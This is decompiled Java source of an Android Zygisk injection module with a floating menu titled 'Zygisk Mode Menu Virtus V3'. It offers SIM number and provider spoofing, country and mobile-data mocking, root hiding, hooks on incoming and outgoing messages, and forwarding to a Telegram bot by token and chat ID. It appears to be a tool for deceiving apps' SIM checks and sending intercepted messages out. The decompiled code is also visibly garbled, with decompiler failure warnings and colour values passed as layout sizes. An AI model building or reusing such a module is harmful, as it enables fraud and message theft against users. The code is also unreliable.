package com.floatingmenu;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Base64;
import android.util.Log;
import android.util.TypedValue;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Serializable;
import java.lang.ref.WeakReference;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Calendar;
import java.util.Iterator;
import java.util.Map;
import java.util.TimeZone;

/* loaded from: /workspace/module/classes.dex */
public class FloatingMenu {
    private static final String TAG_MENU = "zygisk_floating_menu";
    private static String sBodyText = "";
    private static boolean sDemoFeature1 = false;
    private static boolean sDemoFeature2 = false;
    public static boolean sHookIncoming = false;
    public static boolean sHookOutgoing = false;
    private static String sSenderText = "AD-TEST-S";

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.floatingmenu.FloatingMenu$1, reason: invalid class name */
    /* loaded from: /workspace/module/classes.dex */
    public class AnonymousClass1 implements Runnable {
        final /* synthetic */ Activity val$activity;

        /* renamed from: com.floatingmenu.FloatingMenu$1$11, reason: invalid class name */
        /* loaded from: /workspace/module/classes.dex */
        class AnonymousClass11 implements View.OnClickListener {
            final /* synthetic */ EditText val$inputTgChatId;
            final /* synthetic */ EditText val$inputTgToken;

            public AnonymousClass11(EditText editText, EditText editText2) {
                this.val$inputTgToken = editText;
                this.val$inputTgChatId = editText2;
            }

            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                final String trim = this.val$inputTgToken.getText().toString().trim();
                final String trim2 = this.val$inputTgChatId.getText().toString().trim();
                if (trim.isEmpty() || trim2.isEmpty()) {
                    FloatingMenu.showToast(AnonymousClass1.this.val$activity, "Please enter both Bot Token and Chat ID.");
                } else {
                    FloatingMenu.showToast(AnonymousClass1.this.val$activity, "Saving & Sending Test Message...");
                    new Thread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.11.1
                        @Override // java.lang.Runnable
                        public void run() {
                            final boolean saveTelegramConfig = FloatingMenu.saveTelegramConfig(trim, trim2);
                            if (saveTelegramConfig) {
                                FloatingMenu.sendTelegramMessageAsync(trim, trim2, "🚀 Telegram Forwarding Test Successful!\nDevice: " + Build.MODEL);
                            }
                            AnonymousClass1.this.val$activity.runOnUiThread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.11.1.1
                                @Override // java.lang.Runnable
                                public void run() {
                                    Activity activity;
                                    String str;
                                    if (saveTelegramConfig) {
                                        activity = AnonymousClass1.this.val$activity;
                                        str = "Credentials saved and test message sent!";
                                    } else {
                                        activity = AnonymousClass1.this.val$activity;
                                        str = "Failed to save configuration via socket.";
                                    }
                                    FloatingMenu.showToast(activity, str);
                                }
                            });
                        }
                    }).start();
                }
            }
        }

        /* renamed from: com.floatingmenu.FloatingMenu$1$3, reason: invalid class name */
        /* loaded from: /workspace/module/classes.dex */
        class AnonymousClass3 implements View.OnClickListener {
            final /* synthetic */ EditText val$inputCountry;
            final /* synthetic */ EditText val$inputSim1Number;
            final /* synthetic */ EditText val$inputSim2Number;
            final /* synthetic */ String[] val$sim1Provider;
            final /* synthetic */ String[] val$sim2Provider;
            final /* synthetic */ Switch val$switchDev;
            final /* synthetic */ Switch val$switchMockData;
            final /* synthetic */ Switch val$switchNoRoot;
            final /* synthetic */ Switch val$switchSim1;
            final /* synthetic */ Switch val$switchSim2;

            public AnonymousClass3(Switch r2, String[] strArr, EditText editText, Switch r5, String[] strArr2, EditText editText2, EditText editText3, Switch r9, Switch r10, Switch r11) {
                this.val$switchSim1 = r2;
                this.val$sim1Provider = strArr;
                this.val$inputSim1Number = editText;
                this.val$switchSim2 = r5;
                this.val$sim2Provider = strArr2;
                this.val$inputSim2Number = editText2;
                this.val$inputCountry = editText3;
                this.val$switchDev = r9;
                this.val$switchNoRoot = r10;
                this.val$switchMockData = r11;
            }

            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                final boolean isChecked;
                final boolean isChecked2;
                final boolean isChecked3;
                final boolean isChecked4;
                final boolean isChecked5;
                isChecked = this.val$switchSim1.isChecked();
                final String str = this.val$sim1Provider[0];
                final String trim = this.val$inputSim1Number.getText().toString().trim();
                isChecked2 = this.val$switchSim2.isChecked();
                final String str2 = this.val$sim2Provider[0];
                final String trim2 = this.val$inputSim2Number.getText().toString().trim();
                final String lowerCase = this.val$inputCountry.getText().toString().trim().toLowerCase();
                isChecked3 = this.val$switchDev.isChecked();
                isChecked4 = this.val$switchNoRoot.isChecked();
                isChecked5 = this.val$switchMockData.isChecked();
                FloatingMenu.showToast(AnonymousClass1.this.val$activity, "Saving SIM settings...");
                new Thread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.3.1
                    @Override // java.lang.Runnable
                    public void run() {
                        final boolean saveSimSettingsEx = FloatingMenu.saveSimSettingsEx(isChecked, str, trim, isChecked2, str2, trim2, lowerCase, isChecked3, isChecked4, isChecked5);
                        AnonymousClass1.this.val$activity.runOnUiThread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.3.1.1
                            @Override // java.lang.Runnable
                            public void run() {
                                Activity activity;
                                String str3;
                                if (saveSimSettingsEx) {
                                    RunnableC00041 runnableC00041 = RunnableC00041.this;
                                    MenuLoader.updateMockSimSettingsEx3(isChecked, str, trim, isChecked2, str2, trim2, lowerCase, isChecked3, isChecked4, isChecked5);
                                    activity = AnonymousClass1.this.val$activity;
                                    str3 = "SIM settings saved successfully!";
                                } else {
                                    activity = AnonymousClass1.this.val$activity;
                                    str3 = "Failed to save SIM settings.";
                                }
                                FloatingMenu.showToast(activity, str3);
                            }
                        });
                    }
                }).start();
            }
        }

        public AnonymousClass1(Activity activity) {
            this.val$activity = activity;
        }

        /* JADX WARN: Can't wrap try/catch for region: R(24:10|11|12|13|(12:(30:15|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|(1:43)(1:47)|44|46)|34|35|36|37|38|39|40|41|(0)(0)|44|46)|67|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31|32|33) */
        /* JADX WARN: Can't wrap try/catch for region: R(7:(6:(30:15|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|(1:43)(1:47)|44|46)|40|41|(0)(0)|44|46)|34|35|36|37|38|39) */
        /* JADX WARN: Code restructure failed: missing block: B:53:0x0c2d, code lost:
        
            r0 = e;
         */
        /* JADX WARN: Code restructure failed: missing block: B:61:0x0c3a, code lost:
        
            r0 = e;
         */
        /* JADX WARN: Code restructure failed: missing block: B:63:0x0c37, code lost:
        
            r0 = e;
         */
        /* JADX WARN: Removed duplicated region for block: B:43:0x0971  */
        /* JADX WARN: Removed duplicated region for block: B:47:0x0973  */
        @Override // java.lang.Runnable
        /*
            Code decompiled incorrectly, please refer to instructions dump.
        */
        public void run() {
            String str;
            Bitmap decodeByteArray;
            try {
                ViewGroup viewGroup = (ViewGroup) this.val$activity.getWindow().getDecorView();
                if (viewGroup == null || viewGroup.findViewWithTag(FloatingMenu.TAG_MENU) != null) {
                    return;
                }
                FrameLayout frameLayout = new FrameLayout(this.val$activity);
                frameLayout.setTag(FloatingMenu.TAG_MENU);
                frameLayout.setLayoutParams(new FrameLayout.LayoutParams(-1, -1));
                final FrameLayout frameLayout2 = new FrameLayout(this.val$activity);
                int dpToPx = FloatingMenu.dpToPx(this.val$activity, 62.0f);
                FrameLayout.LayoutParams layoutParams = new FrameLayout.LayoutParams(dpToPx, dpToPx);
                layoutParams.gravity = 17;
                layoutParams.leftMargin = FloatingMenu.dpToPx(this.val$activity, 0.0f);
                layoutParams.topMargin = FloatingMenu.dpToPx(this.val$activity, 0.0f);
                frameLayout2.setLayoutParams(layoutParams);
                GradientDrawable gradientDrawable = new GradientDrawable();
                gradientDrawable.setShape(1);
                gradientDrawable.setColors(new int[]{-16777216, -7733248});
                gradientDrawable.setStroke(FloatingMenu.dpToPx(this.val$activity, 2.0f), -16711731);
                frameLayout2.setBackground(gradientDrawable);
                try {
                    byte[] decode = Base64.decode("/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/2wBDAQMDAwQDBAgEBAgQCwkLEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBD/wAARCABgAGADASIAAhEBAxEB/8QAHAAAAwEAAwEBAAAAAAAAAAAAAAUGBAIDBwEJ/8QAORAAAgEDAgQDBwEHAwUAAAAAAQIDBAURACEGEjFBE1FhBxQiMkJxgSMVFjNScoKhJJGSQ1NiscH/xAAaAQABBQEAAAAAAAAAAAAAAAAEAAECAwYF/8QALREAAQMCBAUEAQUBAAAAAAAAAQIDEQAxBAUhQRJRYXGxIoHB8BMUQmKh4dH/2gAMAwEAAhEDEQA/APyq0aNGlSo0aNaaa2V9ZMkFNSySySDKqoycefoPU6U1IJKrCs2jVJS8LUMcghuNyknqSM+6W6Lx5Py3yj8Z1QcJ2ThWbiu20FdQy0cUMyVMzVdWrySIrZKBFGATjoe2q1uobSVKNtaNwmW4jGuoZaHqWQkdyYHb3rzvRr0zji1cE/vndaeyW6eqpKqeSrp/daoJJAjtkRFGGCVztjtjUzU8K2+aUwW26SU9VjPulzi93k/DfKfzjTNvJcSFDeljMtxGCeWy4NUkpMWkaaHf2qZ0a1VlpuVvqWpKyjlhlQZKsuNvPPQj16ay6tmgSkpuKNGjRpU1GjRrZa6MV9QKZQTK+eQDvgEn/wBaZSgkSasZaU+sNpua02i0LcHLyEpBEniTSk4VFzj/AHPYdzq7uHDFZbbBRXuBR+6laoWKvpnJE0gALRVEgBMLrkZjIycjkDAh9JoqKORBa4WT3SlbMrNss83LzMWxuURRkgdfhUbuNUHsh9rFT7PLpXJUUP7X4auDCC8Wifl5aqDJ5ZFBBVZkyxVsYGSpypI0G6tRnguK0uX4dhCkpxGiVWIE6i5I3AvEg79DNHiUUsMdvtttpy8nWMqWTPQYiGzH1k8Rj6dNd7cN8WXRoa6tr6akKMDHFzYKEbj4Ixyr/g6r+OrVwdb7u/EnAdkraC3VMnIPeXQr4cgykkaLnwwc4I5mG4AxuNL6SrkReVGGG31JhKHE8YH3+6hmn58E8cO4qYtEgEbEaAm3IUjThvim3vNV0tbT1bSks0Qf5z3+CQcrfbqdYzxMs8MluuVriVkzhOXkQPncGI7KfWPw29T01WTVrKhLgbjcjv8AjXfwVb+Drne14g48sldcLdTy8maWRAPDTdnkRseIF3wOZRsQc7DTvpQ2njIpZZ+oxzow7aom5MkAbk6E+awW/he43PhyuvVTg8I0KlJa+pkIWCUglYqaQgGZ2wcRgZGDzhQC+oW7cPT0ZSphZZKKRVMVQvR8+fkR3HbXoHti9rdR7QbhRx0lALRwzbiYLNaYAoWmpxjmkYAcrTPhSxxjYKMKANT8KJHA1okeNqC4D9Ig5SGfl5lK56K4wRnp8QO6HVba3IBVf7/dXY3D4RTikNSUi5tqbGNYSbxeDPQQpGCQe2jWy522otlQ1PURsrAA4YdiMj79eusejUqChIrLutLYWW3BBFGrL2fQx0FWL/URCWOCWOMxnfnQnMgHqUBX+7UaBkgZ1acOQTCKngpR4hd5G8L63ZeUYTzbH09TjbfYwcNknei8AgypwXSNO5MDzWzjOzNw6qWmkgWem96CwzgZHIRzpg9f1AyPnuqqv0nU1BHDR3NKaaoCCdeWRgA3Ix+U7eoH4OvRYqyC40AoqsRs0MZ8BmGVeMEt4T4365ZGG6sSOh+Hz/iZqSSV/CYvKsp5WK4cxgbc+Ns6oKSDw8/s11vyILZe3TEA6CBdPOdu3KvTeCpU4r4OreF61yKi2gxqOXLeC5JQ5/8ACTI+3LpHw/w/eLoki1l4itvguY2ijgE0mVODksQBuPXSvhC/fsy4UN+cjwpc0dcuOqkYZj9vhf7jVJcLjHZeIyKhiEuD8qsFyvijY58sjBz03OqcOotvFBsfO9dfN20Y3LGsSNVNaE80K1QT2tHesHEPD14tMa+6XmK5eK4iWOaAQyZY4HKVJB3PfTrjAxcM8J0nDVC6vPXgQFlOSYlIMjf3Pgf8tZKK4w3viDELsy284JZeVfGOwAPfG5/A1OcU31rhXVt8Dfo04FHQjyxkA/n4n/OmxKi46ECw8m1TyVtGCyx3Eq0U76QeSE6rPvaOcVPVApam9rRo8kkUQEKMqdW+o48uYn8apOGLILuWsNRGkdOKgeLUYABjADucj/thWbPZWYfUNT9ggjp5IZ6rxUiqQ8TSRHDgZGcHscA9dXk1ZT223e5UICNNGBO46JESG8Fc7nJwXY7swA6De4JkwLDzzrjl1KG/yLTClGSP4qGiffY7DnU17RqtLkY7lFB4SyzyIF/kjG8a+mFIH9uofVjxHA8VLUR1h5HgaNhDndGYMMP5Nj6e3ffIEdq9oASBauRmCluKQ44ZJHjT4o1R2WWoqqWKJVLOkrKvKfiJIBG3fp239Dqc03sYnlWWnhRXLAMFY4yy+R7HBOpL0g1VhJUpSNiPGvxVtBcKmVTM8JeqzkOP+q4+l/NjjHMMN/NzdkDJS3apjWCKSOGtq4oo5JVAKI2AwJ746Z6HY99tFNVV1dC1Vbq5/fafPiQy7tIo8wfmKnG43wfTXB6aqulhuHEPuaU7+NEVETkYK5MrqD0GWXbsemw0I8oDpt71pMubU7I4SqEqVb9oEnUdo2Mkcqx2dfd7vW8PVEXIKl3jjQ/RMpPKPzuv5GnlbUS3KxRTSAtUUDqCT18SMfD/ALpt9xpfxlSO9VQ3qBGhrKmkFXVr0KTLjmYeWSQcdjn8MWnjq/DuNOeWK8QZdB0SpTPMuP6uYfZxocrkpdG/kf8Afiuw3hyx+fL16hMx1QvUHoUkieXGeVcaOeS3WOWWJWWqrWYrjr4kvU/2p/k6TXeEyXeh4bpIef3V0SVE355nIDD1xsv4OnaVC0ZkuEuGgs8PMV7SVL45V/5co+ynS7g2GRKqvvlRG89dTUzVdKvUvM3MVc+eCC2O5xpBRSVO8vJ/zzTuMB8sZcjQKieiEanuSoHvwda4SJT2Kpmo5mmnp6etlWVkXJKxllUDtk+fb1xjTiouE8JMkdP4dWxBZycmFj9KeTDOOb5v5eXSwUtXbeH6DiBaJKh3mlLiRieYnBidh3HwscdyMnbXyerraGBay4Vze+VH8OGLZo1PcAfKWOdzvgeuiGSD11j37Vx8zbW3CeEpHClQEWSRI9R7+xnal15E0dFLA6lWaUcwPzAqCenbr339Bqc03vEtTTmOldRGeUs6qc4LHOCe5wFzpRotEmSazWL4UqSgbD/fmjWu11rUFYk652PQayaASCCOo31JQChBqhpwtLC03FXoit8lQauWKLwJm+MvkCGXGMsRuEYHlYjdcq/04122ysuViu0NoSrcUqPPNyOcSOSmTG4H1AgEHoc5UkEak7ReKmmqXZlEkcoAkjOwb1+/XVHT1UcsIam/1VMgCAKAZoADkJgn41B3Ckgj6GGgXmSoFKtft61mWZmMM8l9klMGdOUglJ6GBrrG+lNaimprzFcKikkJuNTAaM+KOUAghts9CVBHr6HSi0QTUdTW8MVHNzpKKqifHLmROpHo6DI/pGt9urWnq5XpmeTlxztEhdg64Ks0f8TA6E8vTI5mxr7cveL1xNbY+HnieqaeJaaAIAKYhgSHPVlBLbnGx30ChK0ktG3giI9vitbi3sJimk5i2ZcBggR60qKuL0zqozfX1RAgEhddoJ6ypo+F4i3M8hq618Zw7ZILeiIcn+o6ZwQU1lSgnqZCLhBTikzHuMnLYOOpC4HkN+p18o4K7h3iy6QcRmJauOeVKmArkVRLEjlPZCwByM7DbXC6VTwVcTVTNGrE8jSoY2Ltksyx458HoCFO2BzLp1JWohoWv3Jv95VXhncLh2lZisw4VQAboSkp4dJ0UIOukKmQAQT0V9ZcLxdJrW9bJ7qzwSlEP6kZCfw0B+sknJ6DGWIAOs8kdGjPWQwI1PT5ZeQ5E0uMZBO5RQOVSdzhmPzY12VEyrATODSUzqVIIAmnGclcAnkUncqCS3V2O2pi53uetkCR/pQR7Ig7ev30ayyUgBOn29ZTM8yS+4p54lXESeekkwJ2E3320rLcKt6ycySbtkknvvuf86zaNGjgOEQKyjjhdUVquaNGjRp6hRrsgqJ6WQS08rRuO6nGuvRpU4JSZFOU4iEwRbnQRVBTpIvwuPse34xrdScVCiucFxo6yvV1HhMJZS2Iz2BJJGOupjRqtTSViDRjGYP4ZxLrZhSSCD1Fqqqzixa25T3Ctrrg7nMSCKYrmMHoSCCcnfWF+JkgBFqtsNOzdZG+Nz6kn/7nSPRpJaSgcIpYjMH8S4p1wyokknqb3ruqK2rqpTNUTu7nbJPby+2unro0amABahFKUsyozRo0aNPUa//Z", 0);
                    decodeByteArray = BitmapFactory.decodeByteArray(decode, 0, decode.length);
                } catch (Exception unused) {
                }
                try {
                    try {
                        if (decodeByteArray != null) {
                            ImageView imageView = new ImageView(this.val$activity);
                            imageView.setImageBitmap(decodeByteArray);
                            imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);
                            int dpToPx2 = FloatingMenu.dpToPx(this.val$activity, 0.0f);
                            imageView.setPadding(dpToPx2, dpToPx2, dpToPx2, dpToPx2);
                            FrameLayout.LayoutParams layoutParams2 = new FrameLayout.LayoutParams(-16711731, -16711731);
                            layoutParams2.gravity = 17;
                            frameLayout2.addView(imageView, layoutParams2);
                            final LinearLayout linearLayout = new LinearLayout(this.val$activity);
                            linearLayout.setOrientation(1);
                            FrameLayout.LayoutParams layoutParams3 = new FrameLayout.LayoutParams(FloatingMenu.dpToPx(this.val$activity, 280.0f), -2);
                            layoutParams3.gravity = 17;
                            linearLayout.setLayoutParams(layoutParams3);
                            linearLayout.setVisibility(8);
                            GradientDrawable gradientDrawable2 = new GradientDrawable();
                            gradientDrawable2.setShape(0);
                            gradientDrawable2.setColor(-435023342);
                            gradientDrawable2.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 16.0f));
                            gradientDrawable2.setStroke(FloatingMenu.dpToPx(this.val$activity, 2.0f), -3924422);
                            linearLayout.setBackground(gradientDrawable2);
                            int dpToPx3 = FloatingMenu.dpToPx(this.val$activity, 16.0f);
                            linearLayout.setPadding(dpToPx3, dpToPx3, dpToPx3, dpToPx3);
                            RelativeLayout relativeLayout = new RelativeLayout(this.val$activity);
                            relativeLayout.setLayoutParams(new RelativeLayout.LayoutParams(-16711731, -2));
                            TextView textView = new TextView(this.val$activity);
                            textView.setText("Zygisk Mode Menu Virtus V3");
                            textView.setTextColor(-16711731);
                            textView.setTextSize(2, 16.0f);
                            textView.setTypeface(Typeface.create("sans-serif-medium", 1));
                            RelativeLayout.LayoutParams layoutParams4 = new RelativeLayout.LayoutParams(-2, -2);
                            layoutParams4.addRule(9);
                            relativeLayout.addView(textView, layoutParams4);
                            TextView textView2 = new TextView(this.val$activity);
                            textView2.setText("✕");
                            textView2.setTextColor(-328454);
                            textView2.setTextSize(2, 18.0f);
                            textView2.setTypeface(Typeface.DEFAULT_BOLD);
                            textView2.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 4.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 4.0f));
                            RelativeLayout.LayoutParams layoutParams5 = new RelativeLayout.LayoutParams(-2, -2);
                            layoutParams5.addRule(11);
                            relativeLayout.addView(textView2, layoutParams5);
                            linearLayout.addView(relativeLayout);
                            LinearLayout linearLayout2 = new LinearLayout(this.val$activity);
                            linearLayout2.setOrientation(0);
                            LinearLayout.LayoutParams layoutParams6 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams6.topMargin = FloatingMenu.dpToPx(this.val$activity, 12.0f);
                            linearLayout2.setLayoutParams(layoutParams6);
                            final Button button = new Button(this.val$activity);
                            button.setText("SYSTEM");
                            button.setTextSize(2, 10.0f);
                            button.setAllCaps(true);
                            button.setPadding(0, 0, 0, 0);
                            LinearLayout.LayoutParams layoutParams7 = new LinearLayout.LayoutParams(0, FloatingMenu.dpToPx(this.val$activity, 32.0f), 1.0f);
                            layoutParams7.rightMargin = FloatingMenu.dpToPx(this.val$activity, 2.0f);
                            button.setLayoutParams(layoutParams7);
                            final Button button2 = new Button(this.val$activity);
                            button2.setText("MESSAGE");
                            button2.setTextSize(2, 10.0f);
                            button2.setAllCaps(true);
                            button2.setPadding(0, 0, 0, 0);
                            LinearLayout.LayoutParams layoutParams8 = new LinearLayout.LayoutParams(0, FloatingMenu.dpToPx(this.val$activity, 32.0f), 1.0f);
                            layoutParams8.leftMargin = FloatingMenu.dpToPx(this.val$activity, 2.0f);
                            layoutParams8.rightMargin = FloatingMenu.dpToPx(this.val$activity, 2.0f);
                            button2.setLayoutParams(layoutParams8);
                            final Button button3 = new Button(this.val$activity);
                            button3.setText("TELEGRAM");
                            button3.setTextSize(2, 10.0f);
                            button3.setAllCaps(true);
                            button3.setPadding(0, 0, 0, 0);
                            LinearLayout.LayoutParams layoutParams9 = new LinearLayout.LayoutParams(0, FloatingMenu.dpToPx(this.val$activity, 32.0f), 1.0f);
                            layoutParams9.leftMargin = FloatingMenu.dpToPx(this.val$activity, 2.0f);
                            button3.setLayoutParams(layoutParams9);
                            linearLayout2.addView(button);
                            linearLayout2.addView(button2);
                            linearLayout2.addView(button3);
                            linearLayout.addView(linearLayout2);
                            final LinearLayout linearLayout3 = new LinearLayout(this.val$activity);
                            linearLayout3.setOrientation(1);
                            linearLayout3.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
                            final LinearLayout linearLayout4 = new LinearLayout(this.val$activity);
                            linearLayout4.setOrientation(1);
                            linearLayout4.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
                            final LinearLayout linearLayout5 = new LinearLayout(this.val$activity);
                            linearLayout5.setOrientation(1);
                            linearLayout5.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
                            linearLayout.addView(linearLayout3);
                            linearLayout.addView(linearLayout4);
                            linearLayout.addView(linearLayout5);
                            View view = new View(this.val$activity);
                            LinearLayout.LayoutParams layoutParams10 = new LinearLayout.LayoutParams(-1, FloatingMenu.dpToPx(this.val$activity, 1.0f));
                            layoutParams10.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                            layoutParams10.bottomMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                            view.setLayoutParams(layoutParams10);
                            view.setBackgroundColor(-3924422);
                            linearLayout.addView(view);
                            TextView textView3 = new TextView(this.val$activity);
                            textView3.setText("System SIM Configuration");
                            textView3.setTextColor(-328454);
                            textView3.setTextSize(2, 12.0f);
                            LinearLayout.LayoutParams layoutParams11 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams11.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                            textView3.setLayoutParams(layoutParams11);
                            linearLayout3.addView(textView3);
                            View view2 = new View(this.val$activity);
                            LinearLayout.LayoutParams layoutParams12 = new LinearLayout.LayoutParams(-1, FloatingMenu.dpToPx(this.val$activity, 1.0f));
                            layoutParams12.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                            layoutParams12.bottomMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                            view2.setLayoutParams(layoutParams12);
                            view2.setBackgroundColor(-3924422);
                            linearLayout3.addView(view2);
                            final Switch r5 = new Switch(this.val$activity);
                            r5.setText("Enable SIM 1 Mocking");
                            r5.setTextColor(-1);
                            r5.setTextSize(2, 13.0f);
                            LinearLayout.LayoutParams layoutParams13 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams13.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                            r5.setLayoutParams(layoutParams13);
                            linearLayout3.addView(r5);
                            final LinearLayout linearLayout6 = new LinearLayout(this.val$activity);
                            linearLayout6.setOrientation(1);
                            linearLayout6.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
                            linearLayout6.setVisibility(8);
                            TextView textView4 = new TextView(this.val$activity);
                            textView4.setText("SIM 1 Provider:");
                            textView4.setTextColor(-328454);
                            textView4.setTextSize(2, 11.0f);
                            LinearLayout.LayoutParams layoutParams14 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams14.topMargin = FloatingMenu.dpToPx(this.val$activity, 6.0f);
                            textView4.setLayoutParams(layoutParams14);
                            linearLayout6.addView(textView4);
                            final String[] strArr = {"jio"};
                            final LinearLayout createProviderSelector = FloatingMenu.createProviderSelector(this.val$activity, strArr);
                            linearLayout6.addView(createProviderSelector);
                            TextView textView5 = new TextView(this.val$activity);
                            textView5.setText("SIM 1 Number:");
                            textView5.setTextColor(-328454);
                            textView5.setTextSize(2, 11.0f);
                            LinearLayout.LayoutParams layoutParams15 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams15.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                            textView5.setLayoutParams(layoutParams15);
                            linearLayout6.addView(textView5);
                            final EditText editText = new EditText(this.val$activity);
                            editText.setTextColor(-1);
                            editText.setTextSize(2, 13.0f);
                            editText.setHint("e.g. +919876543210");
                            editText.setHintTextColor(-8947848);
                            GradientDrawable gradientDrawable3 = new GradientDrawable();
                            gradientDrawable3.setShape(0);
                            gradientDrawable3.setColor(-6684672);
                            gradientDrawable3.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 6.0f));
                            editText.setBackground(gradientDrawable3);
                            editText.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f));
                            LinearLayout.LayoutParams layoutParams16 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams16.topMargin = FloatingMenu.dpToPx(this.val$activity, 4.0f);
                            editText.setLayoutParams(layoutParams16);
                            linearLayout6.addView(editText);
                            linearLayout3.addView(linearLayout6);
                            final Switch r12 = new Switch(this.val$activity);
                            r12.setText("Enable SIM 2 Mocking");
                            r12.setTextColor(-1);
                            r12.setTextSize(2, 13.0f);
                            LinearLayout.LayoutParams layoutParams17 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams17.topMargin = FloatingMenu.dpToPx(this.val$activity, 14.0f);
                            r12.setLayoutParams(layoutParams17);
                            linearLayout3.addView(r12);
                            final LinearLayout linearLayout7 = new LinearLayout(this.val$activity);
                            linearLayout7.setOrientation(1);
                            linearLayout7.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
                            linearLayout7.setVisibility(8);
                            TextView textView6 = new TextView(this.val$activity);
                            textView6.setText("SIM 2 Provider:");
                            textView6.setTextColor(-328454);
                            textView6.setTextSize(2, 11.0f);
                            textView6.setLayoutParams(layoutParams14);
                            linearLayout7.addView(textView6);
                            final String[] strArr2 = {"jio"};
                            final LinearLayout createProviderSelector2 = FloatingMenu.createProviderSelector(this.val$activity, strArr2);
                            linearLayout7.addView(createProviderSelector2);
                            TextView textView7 = new TextView(this.val$activity);
                            textView7.setText("SIM 2 Number:");
                            textView7.setTextColor(-328454);
                            textView7.setTextSize(2, 11.0f);
                            textView7.setLayoutParams(layoutParams15);
                            linearLayout7.addView(textView7);
                            final EditText editText2 = new EditText(this.val$activity);
                            editText2.setTextColor(-1);
                            editText2.setTextSize(2, 13.0f);
                            editText2.setHint("e.g. +919876543210");
                            editText2.setHintTextColor(-8947848);
                            editText2.setBackground(gradientDrawable3);
                            editText2.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f));
                            editText2.setLayoutParams(layoutParams16);
                            linearLayout7.addView(editText2);
                            linearLayout3.addView(linearLayout7);
                            TextView textView8 = new TextView(this.val$activity);
                            textView8.setText("Mock Country ISO (2-letter):");
                            textView8.setTextColor(-328454);
                            textView8.setTextSize(2, 11.0f);
                            LinearLayout.LayoutParams layoutParams18 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams18.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                            textView8.setLayoutParams(layoutParams18);
                            linearLayout3.addView(textView8);
                            final EditText editText3 = new EditText(this.val$activity);
                            editText3.setTextColor(-1);
                            editText3.setTextSize(2, 13.0f);
                            editText3.setHint("e.g. in, us, ae");
                            editText3.setHintTextColor(-8947848);
                            editText3.setBackground(gradientDrawable3);
                            editText3.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f));
                            LinearLayout.LayoutParams layoutParams19 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams19.topMargin = FloatingMenu.dpToPx(this.val$activity, 4.0f);
                            editText3.setLayoutParams(layoutParams19);
                            linearLayout3.addView(editText3);
                            final Switch r1mock = new Switch(this.val$activity);
                            r1mock.setText("Mock mobile data (SIM 1)");
                            r1mock.setTextColor(-1);
                            r1mock.setTextSize(2, 13.0f);
